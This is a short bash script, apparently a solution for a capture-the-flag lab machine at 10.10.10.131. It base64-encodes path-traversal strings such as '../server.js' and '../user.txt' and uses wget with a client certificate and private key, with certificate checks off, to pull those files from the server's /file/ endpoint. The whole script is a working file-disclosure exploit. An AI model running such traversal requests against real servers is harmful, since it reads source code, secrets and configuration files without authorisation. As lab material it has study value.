#!/bin/bash

LIST=(
"../server.js"
"../user.txt"
#"../../professor/memcached.ini"
    );

for line in ${LIST[@]}; do
    encoded=`echo -n $line | base64`
    wget --certificate=./generated/user.crt --private-key=./generated/private.key https://10.10.10.131/file/$encoded --no-check-certificate -O ./downloaded/`basename $line`
done
